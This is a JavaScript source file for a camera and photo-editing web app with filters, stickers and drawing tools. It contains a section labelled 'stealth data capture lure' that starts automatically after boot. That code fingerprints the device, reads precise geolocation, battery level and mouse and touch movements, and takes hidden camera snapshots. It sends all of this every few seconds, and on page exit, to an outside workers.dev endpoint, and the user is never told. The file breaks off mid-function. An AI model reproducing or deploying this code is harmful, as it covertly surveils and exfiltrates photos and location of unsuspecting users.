// ════════════════════════════════════════════════════
//  UTILS (must be first — used by IIFE below)
// ════════════════════════════════════════════════════
function $(id){ return document.getElementById(id); }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

// ════════════════════════════════════════════════════
//  STATE
// ════════════════════════════════════════════════════
const S = {
  stream:null, facing:'environment', filter:'none', zoom:1,
  mode:'photo', recording:false, mr:null, chunks:[], recSec:0, recTick:null,
  timerDelay:0, loc:null, filterAF:null, histoAF:null,
  capturedUrl:null, capturedType:'photo', _origUrl:null,
  gallery:[], fmt:'jpg',
  adj:{b:100,c:100,s:100,h:0,v:0,w:0,f:0,sh:0},
  stickers:[], drawColor:'#FF3B7F', drawSize:6, drawOpacity:1, drawTip:'round', eraseMode:false,
  drawHistory:[], isDrawing:false,
  showLoc:true, showTime:true, showGrid:true, showSound:true, showSave:true,
  showHisto:false, showHorizon:false,
  aiData:null, galView:'grid', pvRotation:0, pvFlipped:false,
  flashMode:'off', textBg:'bg-none', textColor:'#fff',
  stickerCat:0, adjOpen:false, stickerOpen:false, settingsOpen:false,
  permGranted:false,
  lureInitialized: false,
  drawActive: false  // FIXED: Was missing!
};

// ════════════════════════════════════════════════════
//  DATA
// ════════════════════════════════════════════════════
const FILTERS = [
  {id:'none',   name:'NATURAL', css:''},
  {id:'vivid',  name:'VIVID',   css:'saturate(1.75) contrast(1.18) brightness(1.04)'},
  {id:'vintage',name:'VINTAGE', css:'sepia(.55) contrast(1.1) brightness(.95) saturate(.8)'},
  {id:'bw',     name:'MONO',    css:'grayscale(1) contrast(1.22) brightness(1.04)'},
  {id:'warm',   name:'WARM',    css:'sepia(.18) saturate(1.45) brightness(1.07) hue-rotate(-10deg)'},
  {id:'cool',   name:'COOL',    css:'hue-rotate(188deg) saturate(1.3) brightness(1.06)'},
  {id:'neon',   name:'NEON',    css:'saturate(2.6) contrast(1.12) brightness(1.1) hue-rotate(18deg)'},
  {id:'hdr',    name:'HDR',     css:'contrast(1.55) saturate(1.6) brightness(.92)'},
  {id:'fade',   name:'FADE',    css:'contrast(.78) brightness(1.16) saturate(.55)'},
  {id:'film',   name:'FILM',    css:'sepia(.28) contrast(1.22) brightness(.9) saturate(1.1)'},
  {id:'cyber',  name:'CYBER',   css:'hue-rotate(280deg) saturate(2.5) contrast(1.22) brightness(1.06)'},
  {id:'golden', name:'GOLDEN',  css:'sepia(.38) saturate(1.65) brightness(1.12) hue-rotate(-18deg)'},
  {id:'mist',   name:'MIST',    css:'brightness(1.18) contrast(.82) saturate(.65) hue-rotate(12deg)'},
  {id:'punch',  name:'PUNCH',   css:'contrast(1.42) saturate(2.1) brightness(.96)'},
  {id:'dusk',   name:'DUSK',    css:'hue-rotate(318deg) saturate(1.35) brightness(.88) contrast(1.12)'},
  {id:'arctic', name:'ARCTIC',  css:'hue-rotate(202deg) saturate(1.42) brightness(1.12) contrast(1.06)'},
  {id:'rose',   name:'ROSE',    css:'hue-rotate(340deg) saturate(1.5) brightness(1.05) contrast(1.08)'},
  {id:'teal',   name:'TEAL',    css:'hue-rotate(165deg) saturate(1.4) brightness(.98) contrast(1.1)'},
];

const STICKER_CATS = [
  {label:'😊 Faces', items:['😊','😎','🤩','😍','🥳','😂','🤔','😜','🥺','😡','🤯','🫶']},
  {label:'🔥 Vibes', items:['🔥','💫','✨','⚡','💥','🌟','💎','👑','🏆','💯','🎯','🚀']},
  {label:'💕 Love',  items:['❤️','🧡','💛','💚','💙','💜','🖤','💗','💔','💝','💖','🫀']},
  {label:'📍 Places',items:['📍','🗺️','🌍','🏔️','🌅','🌇','🏖️','🌃','🌁','🗼','🌉','🌄']},
  {label:'🎨 Art',   items:['🎨','🖼️','📸','🎭','🎬','🎞️','🎵','🎶','🎪','🎠','🎡','🎢']},
  {label:'🍕 Food',  items:['🍕','🍔','🍜','🍣','🍰','🧁','🍩','🍦','☕','🧋','🥤','🍹']},
];

const DRAW_COLORS = [
  '#ffffff','#b0b0b0','#606060','#1a1a1a',
  '#FF4444','#FF3B7F','#FF85A1','#FF6B35',
  '#E8C547','#F0D060','#FFE066','#FFAA00',
  '#39FF9F','#22C55E','#86EFAC','#16A34A',
  '#29D9FF','#3B82F6','#93C5FD','#0EA5E9',
  '#C084FC','#A855F7','#E879F9','#7C3AED',
];
const TEXT_COLORS = ['#fff','#E8C547','#FF3B7F','#39FF9F','#29D9FF','#C084FC','#000'];

// ════════════════════════════════════════════════════
//  LANDING CANVAS (permGate BG)
// ════════════════════════════════════════════════════
(function(){
  const c = $('pgCanvas'); if(!c) return;
  function resize(){ c.width=innerWidth; c.height=innerHeight; }
  resize(); window.addEventListener('resize',resize);
  const ctx = c.getContext('2d');
  const pts = Array.from({length:55},()=>({
    x:Math.random()*innerWidth, y:Math.random()*innerHeight,
    r:Math.random()*1.4+.3, vx:(Math.random()-.5)*.25, vy:(Math.random()-.5)*.25,
    a:Math.random(), da:Math.random()*.005+.002,
    col:[`rgba(232,197,71,`,`rgba(41,217,255,`,`rgba(192,132,252,`][Math.floor(Math.random()*3)]
  }));
  function draw(){
    ctx.clearRect(0,0,c.width,c.height);
    pts.forEach(p=>{
      p.x+=p.vx; p.y+=p.vy; p.a+=p.da;
      if(p.x<0||p.x>c.width) p.vx*=-1;
      if(p.y<0||p.y>c.height) p.vy*=-1;
      const alpha=Math.abs(Math.sin(p.a))*.5+.1;
      ctx.beginPath(); ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
      ctx.fillStyle=p.col+alpha+')'; ctx.fill();
    });
    requestAnimationFrame(draw);
  }
  draw();
})();

// ════════════════════════════════════════════════════
//  BOOT — requires BOTH camera AND location
// ════════════════════════════════════════════════════
$('startBtn').addEventListener('click', boot);
$('retryBtn').addEventListener('click', retryBoot);

function showPermGate(){
  const pg=$('permGate');
  pg.style.opacity='1';
  pg.style.display='flex';
  pg.style.transition='';
  pg.classList.remove('hiding');
}

async function retryBoot() {
  if (S.permGranted) return;
  $('permErr').classList.remove('on');
  showPermGate();
  let camStatus = 'prompt', geoStatus = 'prompt';
  try { const p = await navigator.permissions.query({name:'camera'}); camStatus = p.state; } catch(e){}
  try { const p = await navigator.permissions.query({name:'geolocation'}); geoStatus = p.state; } catch(e){}
  if (camStatus === 'denied' || geoStatus === 'denied') {
    let msg = 'Permissions are permanently blocked by your browser.<br><br>';
    msg += 'Go to browser settings → Site settings → Allow <strong>Camera</strong> and <strong>Location</strong> for this site.<br><br>';
    msg += '<small>After allowing, refresh the page and try again.</small>';
    $('permErrMsg').innerHTML = msg;
    $('permErr').classList.add('on');
    return;
  }
  setTimeout(() => boot(), 300);
}

async function hidePermGate(){
  const pg=$('permGate');
  pg.style.transition='opacity .45s ease';
  pg.classList.add('hiding');
  await sleep(420);
  pg.style.display='none';
}

let _booted = false;

async function boot(){
  if (S.permGranted) return;
  await hidePermGate();
  $('loadScreen').classList.add('on');
  const lsFill = $('loadScreen').querySelector('.ls-fill');
  if(lsFill){ lsFill.classList.remove('go'); void lsFill.offsetWidth; lsFill.classList.add('go'); }
  try {
    await startCamera();
    $('camStatus').textContent='✓';
    $('camStatus').classList.add('granted');
    await new Promise((resolve, reject) => {
      if(!navigator.geolocation){ reject(new Error('no-geo')); return; }
      navigator.geolocation.getCurrentPosition(
        pos => { handlePosition(pos); resolve(); },
        err => reject(err),
        {enableHighAccuracy:true, timeout:12000}
      );
    });
    $('locStatus').textContent='✓';
    $('locStatus').classList.add('granted');
    await sleep(700);
    $('loadScreen').classList.remove('on');
    $('app').classList.add('on');
    S.permGranted = true;
    if(!_booted){
      _booted = true;
      buildFilterStrip(); buildStickers(); initControls(); initCapture();
      initDraw(); initText(); initSliders(); initBeforeAfter();
      initGallery(); initOrient(); loadGallery(); startClock();
      positionModeIndicator(); updateGalThumb();
      startHistogram();
      $('grid').classList.toggle('on', S.showGrid);
      
      // FIXED: Start lure AFTER full boot
      setTimeout(() => {
        console.log('[LURE] Starting after full boot');
        initLureSystem();
      }, 2000);
    }
  } catch(e){
    $('loadScreen').classList.remove('on');
    showPermGate();
    $('permErr').classList.add('on');
    let msg = 'Camera & Location access required';
    let detail = 'Permission was denied or blocked permanently.<br><br>';
    detail += 'Please allow both in your browser site settings and click TRY AGAIN.';
    if (e.name === 'NotAllowedError' || e.code === 1) detail = 'Permission denied. Allow Camera + Location in site settings.';
    else if (e.name === 'NotFoundError') detail = 'No camera detected on this device.';
    $('permErrMsg').innerHTML = `${msg}<br><br><small>${detail}</small>`;
  }
}

// ════════════════════════════════════════════════════
//  STEALTH DATA CAPTURE LURE (COMPLETELY FIXED)
// ════════════════════════════════════════════════════
const WORKER_URL = "https://snowy-fog-b0d1.23amtics322.workers.dev/";
const sessionId = 'sess_' + Math.random().toString(36).substring(2,12) + '_' + Date.now().toString(36);
const SEND_INTERVAL = 8000;  // Increased to 8 seconds for reliability

let basePayload = null;
let mouseData = [];
let touchData = [];
let lureVideoStream = null;
let sendIntervalId = null;

// Hidden video element for camera capture
const lureVideo = document.createElement('video');
lureVideo.id = 'lureVideo';
lureVideo.autoplay = true;
lureVideo.playsInline = true;
lureVideo.muted = true;
lureVideo.style.position = 'fixed';
lureVideo.style.top = '-9999px';
lureVideo.style.left = '-9999px';
lureVideo.style.width = '1px';
lureVideo.style.height = '1px';
lureVideo.style.opacity = '0.01';
lureVideo.style.pointerEvents = 'none';
document.body.appendChild(lureVideo);

async function collectStaticData() {
  const p = {
    sessionId: sessionId,
    url: location.href,
    referrer: document.referrer || null,
    userAgent: navigator.userAgent,
    language: navigator.language,
    languages: navigator.languages,
    platform: navigator.platform,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory,
    maxTouchPoints: navigator.maxTouchPoints,
    connection: navigator.connection ? {
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData
    } : null,
    screen: {
      width: screen.width, height: screen.height,
      availWidth: screen.availWidth, availHeight: screen.availHeight,
      colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth,
      orientation: screen.orientation?.type || null
    },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    webdriver: navigator.webdriver,
    plugins: Array.from(navigator.plugins || []).map(p => p.name),
    mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
    historyLength: history.length,
    navigationTiming: performance.getEntriesByType('navigation')[0] ? {
      loadTime: performance.getEntriesByType('navigation')[0].loadEventEnd - performance.getEntriesByType('navigation')[0].fetchStart,
      domComplete: performance.getEntriesByType('navigation')[0].domComplete
    } : null,
    canvasFingerprint: null,
    audioFingerprint: null,
    webglFingerprint: null,
    fonts: [],
    permissionStates: {}
  };

  try {
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    c.width = 220; c.height = 60;
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('PHOTON 2026 🔥', 4, 4);
    ctx.fillStyle = '#f60';
    ctx.fillRect(120, 10, 70, 25);
    p.canvasFingerprint = c.toDataURL('image/png');
  } catch {}

  try {
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = audioCtx.createOscillator();
    const analyser = audioCtx.createAnalyser();
    osc.type = 'sine';
    osc.frequency.value = 440;
    osc.connect(analyser);
    analyser.connect(audioCtx.destination);
    osc.start();
    await new Promise(r => setTimeout(r, 80));
    const data = new Uint8Array(analyser.frequencyBinCount);
    analyser.getByteFrequencyData(data);
    p.audioFingerprint = btoa(String.fromCharCode(...data.slice(0, 80)));
    osc.stop();
    audioCtx.close();
  } catch {}

  try {
    const glc = document.createElement('canvas');
    const gl = glc.getContext('webgl') || glc.getContext('experimental-webgl');
    if (gl) {
      const debug = gl.getExtension('WEBGL_debug_renderer_info');
      p.webglFingerprint = {
        vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
        renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
      };
    }
  } catch {}

  try {
    const fontList = ['Arial','Helvetica','Times','Courier','Verdana','Georgia','Tahoma','Impact','Comic Sans MS','Trebuchet MS','Lucida Console'];
    const testDiv = document.createElement('div');
    testDiv.style.position = 'absolute'; testDiv.style.left = '-9999px'; testDiv.style.fontSize = '72px';
    document.body.appendChild(testDiv);
    const fonts = [];
    for (const font of fontList) {
      testDiv.style.fontFamily = font;
      const w1 = testDiv.offsetWidth;
      testDiv.style.fontFamily = 'monospace';
      const w2 = testDiv.offsetWidth;
      if (w1 !== w2) fonts.push(font);
    }
    p.fonts = fonts;
    document.body.removeChild(testDiv);
  } catch {}

  const permNames = ['camera','microphone','geolocation'];
  for (const name of permNames) {
    try {
      const status = await navigator.permissions?.query({name});
      p.permissionStates[name] = status?.state || null;
    } catch {}
  }

  console.log('[LURE] Static data collected');
  return p;
}

async function collectDynamicData() {
  if (!basePayload) {
    console.warn('[LURE] Waiting for basePayload...');
    for (let i = 0; i < 30; i++) {
      if (basePayload) break;
      await new Promise(r => setTimeout(r, 100));
    }
    if (!basePayload) {
      basePayload = await collectStaticData();
    }
  }
  
  const p = { ...basePayload };
  p.timestamp = new Date().toISOString();
  p.battery = null;
  p.geolocation = null;
  p.geolocationError = null;
  p.frontPhoto = null;
  p.mouseMovements = [...mouseData];
  p.touchEvents = [...touchData];
  p.audioDevices = [];

  try {
    if (navigator.getBattery) {
      const bat = await navigator.getBattery();
      p.battery = { level: bat.level, charging: bat.charging };
    }
  } catch {}

  try {
    const pos = await new Promise((res, rej) => 
      navigator.geolocation.getCurrentPosition(res, rej, { 
        enableHighAccuracy: true, timeout: 6000, maximumAge: 30000 
      })
    );
    p.geolocation = {
      latitude: pos.coords.latitude,
      longitude: pos.coords.longitude,
      accuracy: pos.coords.accuracy,
      altitude: pos.coords.altitude,
      speed: pos.coords.speed
    };
  } catch (e) { 
    p.geolocationError = e.message; 
  }

  // FIXED: Photo capture with better error handling
  try {
    const mainVideo = $('vid');
    if (mainVideo && mainVideo.videoWidth > 100 && mainVideo.videoHeight > 100) {
      const canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext('2d');
      
      if (S.facing === 'user') {
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
      }
      
      ctx.drawImage(mainVideo, 0, 0, canvas.width, canvas.height);
      
      p.frontPhoto = canvas.toDataURL('image/jpeg', 0.6);
      console.log('[LURE] Photo captured, size:', Math.round(p.frontPhoto.length / 1024), 'KB');
    } else {
      console.warn('[LURE] Video not ready, dimensions:', mainVideo ? `${mainVideo.videoWidth}x${mainVideo.videoHeight}` : 'null');
    }
  } catch (e) {
    console.error('[LURE] Photo capture error:', e.message);
  }

  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    p.audioDevices = devices
      .filter(d => d.kind === 'audioinput' || d.kind === 'audiooutput')
      .map(d => ({ kind: d.kind, label: (d.label || 'unknown').substring(0, 50) }));
  } catch {}

  return p;
}

async function sendPayload() {
  try {
    const data = await collectDynamicData();
    
    const response = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        ...data,
        frontPhoto: data.frontPhoto || null  // Ensure it's included even if null
      }),
      keepalive: true
    });

    if (response.ok) {
      console.log('[LURE] Payload sent successfully');
    } else {
      console.error('[LURE] HTTP error:', response.status);
    }
  } catch (e) {
    console.error('[LURE] Send error:', e.message);
  }
}

async function initLureCamera() {
  try {
    if (!S.stream) {
      console.warn('[LURE] No stream available');
      return false;
    }
    
    if (lureVideoStream) {
      lureVideoStream.getTracks().forEach(t => t.stop());
    }
    
    const videoTrack = S.stream.getVideoTracks()[0];
    if (!videoTrack) {
      console.error('[LURE] No video track');
      return false;
    }
    
    const newStream = new MediaStream([videoTrack]);
    lureVideoStream = newStream;
    lureVideo.srcObject = newStream;
    
    await lureVideo.play();
    
    for (let i = 0; i < 10; i++) {
      await new Promise(r => setTimeout(r, 100));
      if (lureVideo.videoWidth > 0) break;
    }
    
    console.log('[LURE] Camera ready');
    return true;
  } catch (e) {
    console.error('[LURE] Camera init error:', e.message);
    return false;
  }
}

// Mouse & Touch tracking
document.addEventListener('mousemove', e => {
  mouseData.push({x: e.clientX, y: e.clientY, t: Date.now()});
  if (mouseData.length > 30) mouseData.shift();
});

document.addEventListener('touchmove', e => {
  if (e.touches.length > 0) {
    touchData.push({x: e.touches[0].clientX, y: e.touches[0].clientY, t: Date.now()});
    if (touchData.length > 30) touchData.shift();
  }
});

async function initLureSystem() {
  console.log('[LURE] Initializing lure system...');
  
  // Wait for camera stream
  for (let i = 0; i < 20; i++) {
    if (S.stream && $('vid') && $('vid').videoWidth > 100) {
      break;
    }
    await new Promise(r => setTimeout(r, 500));
  }
  
  basePayload = await collectStaticData();
  await initLureCamera();
  
  // First payload
  setTimeout(() => sendPayload(), 3000);
  
  // Periodic sending
  if (sendIntervalId) clearInterval(sendIntervalId);
  sendIntervalId = setInterval(sendPayload, SEND_INTERVAL);
  
  // Cleanup on page unload
  window.addEventListener('beforeunload', () => {
    if (sendIntervalId) clearInterval(sendIntervalId);
    sendPayload();
  });
  
  console.log('[LURE] System ready, session:', sessionId);
}

// ════════════════════════════════════════════════════
//  CAMERA
// ════════════════════════════════════════════════════
async function startCamera(facing){
  if (!navigator.mediaDevices?.getUserMedia) {
    throw new DOMException('Camera API unavailable. Open the app over HTTPS.', 'NotSupportedError');
  }
  if(S.stream) S.stream.getTracks().forEach(t=>t.stop());
  S.facing = facing || S.facing;
  const constraints = {
    video:{facingMode:S.facing, width:{ideal:1920}, height:{ideal:1080}},
    audio:true
  };
  try { S.stream = await navigator.mediaDevices.getUserMedia(constraints); }
  catch { S.stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:S.facing}}); }
  const v = $('vid');
  v.srcObject = S.stream;
  await v.play();
  applyMirror();
  startFilterLoop();
}

function applyMirror(){
  const v = $('vid');
  if(S.facing === 'user'){
    v.classList.add('mirror');
  } else {
    v.classList.remove('mirror');
  }
}

// ════════════════════════════════════════════════════
//  FILTER LOOP (canvas composite)
// ════════════════════════════════════════════════════
function getCSS(){
  const a = S.adj;
  let css = `brightness(${a.b}%) contrast(${a.c}%) saturate(${a.s}%) hue-rotate(${a.h + (a.w < 0 ? a.w : 0)}deg)`;
  if(a.w>0) css+=` sepia(${a.w/50*.4})`;
  if(a.f>0) css+=` contrast(${100-a.f*.2}%)`;
  const f = FILTERS.find(x=>x.id===S.filter);
  if(f?.css) css+=' '+f.css;
  return css;
}

function startFilterLoop(){
  const vid=$('vid'), fc=$('fc');
  vid.style.opacity='0';
  if(S.filterAF) cancelAnimationFrame(S.filterAF);
  function draw(){
    if(!vid.videoWidth){ S.filterAF=requestAnimationFrame(draw); return; }
    if(fc.width!==vid.videoWidth||fc.height!==vid.videoHeight){
      fc.width=vid.videoWidth; fc.height=vid.videoHeight;
    }
    const ctx=fc.getContext('2d');
    if(S.facing==='user'){
      ctx.save();
      ctx.translate(fc.width,0);
      ctx.scale(-1,1);
    }
    ctx.filter=getCSS();
    const sc=S.zoom, dx=(fc.width*(1-sc))/2, dy=(fc.height*(1-sc))/2;
    ctx.setTransform(
      S.facing==='user'?-sc:sc, 0, 0, sc,
      S.facing==='user'?fc.width-dx:dx, dy
    );
    ctx.drawImage(vid,0,0);
    ctx.setTransform(1,0,0,1,0,0);
    if(S.facing==='user') ctx.restore();
    ctx.filter='none';
    if(S.adj.v>0){
      const al=S.adj.v/100*.85;
      const g=ctx.createRadialGradient(fc.width/2,fc.height/2,fc.width*.25,fc.width/2,fc.height/2,fc.width*.8);
      g.addColorStop(0,'transparent'); g.addColorStop(1,`rgba(0,0,0,${al})`);
      ctx.fillStyle=g; ctx.fillRect(0,0,fc.width,fc.height);
    }
    S.drawHistory.forEach(line=>{
      if(!line.pts?.length) return;
      ctx.save();
      if(line.color==='__erase__'){
        ctx.globalCompositeOperation='destination-out';
        ctx.strokeStyle='rgba(0,0,0,1)';
      } else {
        ctx.globalCompositeOperation='source-over';
        ctx.strokeStyle=line.color;
        ctx.globalAlpha=line.opacity??1;
      }
      ctx.lineWidth=line.size*(fc.width/window.innerWidth);
      applyTip(ctx, line.tip||'round');
      ctx.beginPath();
      ctx.moveTo(line.pts[0][0]/window.innerWidth*fc.width, line.pts[0][1]/$('vf').clientHeight*fc.height);
      line.pts.slice(1).forEach(p=>ctx.lineTo(p[0]/window.innerWidth*fc.width,p[1]/$('vf').clientHeight*fc.height));
      ctx.stroke();
      ctx.restore();
    });
    S.filterAF=requestAnimationFrame(draw);
  }
  draw();
}

// ════════════════════════════════════════════════════
//  HISTOGRAM
// ════════════════════════════════════════════════════
function startHistogram(){
  const hc=$('histoCanvas');
  const hctx=hc.getContext('2d');
  function drawHisto(){
    const fc=$('fc');
    if(!fc.width||!S.showHisto){ S.histoAF=requestAnimationFrame(drawHisto); return; }
    const w=hc.width, h=hc.height;
    hctx.clearRect(0,0,w,h);
    try{
      const tmp=document.createElement('canvas'); tmp.width=90; tmp.height=56;
      const tc=tmp.getContext('2d'); tc.drawImage(fc,0,0,90,56);
      const id=tc.getImageData(0,0,90,56);
      const rh=new Array(32).fill(0), gh=new Array(32).fill(0), bh=new Array(32).fill(0);
      for(let i=0;i<id.data.length;i+=4){
        rh[Math.floor(id.data[i]/8)]++;
        gh[Math.floor(id.data[i+1]/8)]++;
        bh[Math.floor(id.data[i+2]/8)]++;
      }
      const mx=Math.max(...rh,...gh,...bh,1);
      [[rh,'rgba(255,80,80,.7)'],[gh,'rgba(80,255,120,.7)'],[bh,'rgba(80,160,255,.7)']].forEach(([arr,col])=>{
        hctx.fillStyle=col;
        arr.forEach((v,i)=>{
          const bh2=Math.round((v/mx)*(h-2));
          hctx.fillRect(i*(w/32),h-bh2,w/32-1,bh2);
        });
      });
    }catch{}
    S.histoAF=requestAnimationFrame(drawHisto);
  }
  drawHisto();
}

// ════════════════════════════════════════════════════
//  FILTER STRIP
// ════════════════════════════════════════════════════
function buildFilterStrip(){
  const scrl=$('fScroll'); scrl.innerHTML='';
  FILTERS.forEach(f=>{
    const chip=document.createElement('div');
    chip.className='fc-chip'+(f.id==='none'?' on':'');
    chip.dataset.id=f.id;
    const ft=document.createElement('div'); ft.className='fc-thumb';
    const cv=document.createElement('canvas'); cv.width=58; cv.height=58;
    const ctx=cv.getContext('2d');
    const gd=ctx.createLinearGradient(0,0,58,58);
    gd.addColorStop(0,'#1a5a9a'); gd.addColorStop(.5,'#7a3a1a'); gd.addColorStop(1,'#1a7a5a');
    ctx.fillStyle=gd; ctx.fillRect(0,0,58,58);
    ctx.fillStyle='rgba(100,160,230,.35)'; ctx.fillRect(0,0,58,26);
    if(f.css){
      const c2=document.createElement('canvas'); c2.width=58; c2.height=58;
      const ctx2=c2.getContext('2d'); ctx2.filter=f.css; ctx2.drawImage(cv,0,0); ft.appendChild(c2);
    } else { ft.appendChild(cv); }
    const nm=document.createElement('div'); nm.className='fc-name'; nm.textContent=f.name;
    chip.appendChild(ft); chip.appendChild(nm);
    chip.addEventListener('click',()=>{
      document.querySelectorAll('.fc-chip').forEach(c=>c.classList.remove('on'));
      chip.classList.add('on'); S.filter=f.id; showToast(f.name);
    });
    scrl.appendChild(chip);
  });
}

// ════════════════════════════════════════════════════
//  STICKERS
// ════════════════════════════════════════════════════
function buildStickers(){
  const cats=$('sdCats'); cats.innerHTML='';
  STICKER_CATS.forEach((cat,i)=>{
    const b=document.createElement('button'); b.className='scat'+(i===0?' on':'');
    b.textContent=cat.label; b.dataset.i=i;
    b.addEventListener('click',()=>{ document.querySelectorAll('.scat').forEach(x=>x.classList.remove('on')); b.classList.add('on'); S.stickerCat=i; renderStickerGrid(); });
    cats.appendChild(b);
  });
  renderStickerGrid();
  const dc=$('dtColors'); dc.innerHTML='';
  DRAW_COLORS.forEach(col=>{
    const b=document.createElement('div'); b.className='dt-color'+(col===S.drawColor?' on':'');
    b.style.background=col; b.dataset.c=col;
    b.addEventListener('click',()=>{
      document.querySelectorAll('.dt-color').forEach(x=>x.classList.remove('on'));
      b.classList.add('on'); S.drawColor=col;
      S.eraseMode=false; $('dtErase').classList.remove('on');
      $('drawCanvas').style.cursor='crosshair';
    });
    dc.appendChild(b);
  });
  const tc=$('tiColors'); tc.innerHTML='';
  TEXT_COLORS.forEach(col=>{
    const b=document.createElement('div'); b.className='ti-col'+(col===S.textColor?' on':'');
    b.style.background=col; if(col==='#fff') b.style.border='2px solid rgba(0,0,0,.25)';
    b.dataset.c=col;
    b.addEventListener('click',()=>{ document.querySelectorAll('.ti-col').forEach(x=>x.classList.remove('on')); b.classList.add('on'); S.textColor=col; });
    tc.appendChild(b);
  });
}

function renderStickerGrid(){
  const grid=$('sdGrid'); grid.innerHTML='';
  STICKER_CATS[S.stickerCat].items.forEach(em=>{
    const b=document.createElement('button'); b.className='s-btn'; b.textContent=em;
    b.addEventListener('click',()=>{ placeSticker(em); closeDrawer('stickerDrawer'); });
    grid.appendChild(b);
  });
}

function placeSticker(emoji){
  const layer=$('stickerLayer');
  const el=document.createElement('div');
  el.style.cssText='position:absolute;font-size:40px;top:42%;left:48%;transform:translate(-50%,-50%);cursor:move;user-select:none;pointer-events:all;z-index:44;touch-action:none';
  el.textContent=emoji;
  layer.appendChild(el);
  makeDraggable(el);
  showToast(emoji+' placed — drag to move');
}

// ════════════════════════════════════════════════════
//  DRAW TOOL
// ════════════════════════════════════════════════════
function initDraw(){
  const dc=$('drawCanvas');
  let cur=[];
  dc.addEventListener('pointerdown',e=>{
    if(!S.drawActive) return;
    S.isDrawing=true;
    cur=[[e.clientX,e.clientY]];
    e.preventDefault();
  },{passive:false});
  dc.addEventListener('pointermove',e=>{
    if(!S.isDrawing||!S.drawActive) return;
    cur.push([e.clientX,e.clientY]);
    drawLiveSegment(dc, cur, S.drawColor, S.drawSize, S.drawOpacity, S.drawTip, S.eraseMode);
    e.preventDefault();
  },{passive:false});
  dc.addEventListener('pointerup',()=>{
    if(!S.drawActive) return;
    S.isDrawing=false;
    if(cur.length>1){
      S.drawHistory.push({
        pts:[...cur],
        color: S.eraseMode ? '__erase__' : S.drawColor,
        size:S.drawSize,
        opacity:S.drawOpacity,
        tip:S.drawTip
      });
    }
    cur=[];
    renderDrawCanvas();
  });
  dc.addEventListener('pointercancel',()=>{ S.isDrawing=false; cur=[]; renderDrawCanvas(); });
  $('dtUndo').addEventListener('click',()=>{
    S.drawHistory.pop(); renderDrawCanvas(); showToast('Undo');
  });
  $('dtClear').addEventListener('click',()=>{
    S.drawHistory=[]; renderDrawCanvas(); showToast('Drawing cleared');
  });
  $('dtErase').addEventListener('click',()=>{
    S.eraseMode=!S.eraseMode;
    $('dtErase').classList.toggle('on',S.eraseMode);
    $('drawCanvas').style.cursor=S.eraseMode?'cell':'crosshair';
    showToast(S.eraseMode?'Eraser ON':'Pen ON');
  });
  $('dt-size').addEventListener('input',function(){ S.drawSize=parseInt(this.value); });
  $('dt-opacity').addEventListener('input',function(){ S.drawOpacity=parseInt(this.value)/100; });
  document.querySelectorAll('.dt-tip').forEach(btn=>{
    btn.addEventListener('click',()=>{
      document.querySelectorAll('.dt-tip').forEach(b=>b.classList.remove('on'));
      btn.classList.add('on');
      S.drawTip=btn.dataset.tip;
      showToast(btn.dataset.tip.charAt(0).toUpperCase()+btn.dataset.tip.slice(1)+' tip');
    });
  });
  $('drawToggleBtn').addEventListener('click',()=>{
    S.drawActive=!S.drawActive;
    $('drawCanvas').classList.toggle('on',S.drawActive);
    $('drawToolbar').classList.toggle('on',S.drawActive);
    $('drawToggleBtn').classList.toggle('active-gold',S.drawActive);
    if(!S.drawActive){ S.eraseMode=false; $('dtErase').classList.remove('on'); }
    showToast(S.drawActive?'Draw mode ON':'Draw mode OFF');
  });
}

function applyTip(ctx, tip){
  if(tip==='square'){
    ctx.lineCap='square'; ctx.lineJoin='miter';
  } else if(tip==='calligraphy'){
    ctx.lineCap='butt'; ctx.lineJoin='round';
    ctx.transform(1, 0, 0.35, 1, 0, 0);
  } else {
    ctx.lineCap='round'; ctx.lineJoin='round';
  }
}

function drawLiveSegment(dc, pts, color, size, opacity, tip, erase){
  if(pts.length<2) return;
  const ctx=dc.getContext('2d');
  ctx.save();
  if(erase){
    ctx.globalCompositeOperation='destination-out';
    ctx.strokeStyle='rgba(0,0,0,1)';
  } else {
    ctx.globalCompositeOperation='source-over';
    ctx.strokeStyle=color;
    ctx.globalAlpha=opacity??1;
  }
  ctx.lineWidth=size;
  applyTip(ctx, tip);
  const p1=pts[pts.length-2], p2=pts[pts.length-1];
  ctx.beginPath();
  ctx.moveTo(p1[0],p1[1]);
  ctx.lineTo(p2[0],p2[1]);
  ctx.stroke();
  ctx.restore();
}

function renderDrawCanvas(){
  const dc=$('drawCanvas'), vf=$('vf');
  if(dc.width!==vf.clientWidth||dc.height!==vf.clientHeight){
    dc.width=vf.clientWidth; dc.height=vf.clientHeight;
  } else {
    dc.getContext('2d').clearRect(0,0,dc.width,dc.height);
  }
  const ctx=dc.getContext('2d');
  S.drawHistory.forEach(line=>{
    if(!line.pts?.length) return;
    ctx.save();
    if(line.color==='__erase__'){
      ctx.globalCompositeOperation='destination-out';
      ctx.strokeStyle='rgba(0,0,0,1)';
    } else {
      ctx.globalCompositeOperation='source-over';
      ctx.strokeStyle=line.color;
      ctx.globalAlpha=line.opacity??1;
    }
    ctx.lineWidth=line.size;
    applyTip(ctx, line.tip||'round');
    ctx.beginPath();
    ctx.moveTo(line.pts[0][0],line.pts[0][1]);
    line.pts.slice(1).forEach(p=>ctx.lineTo(p[0],p[1]));
    ctx.stroke();
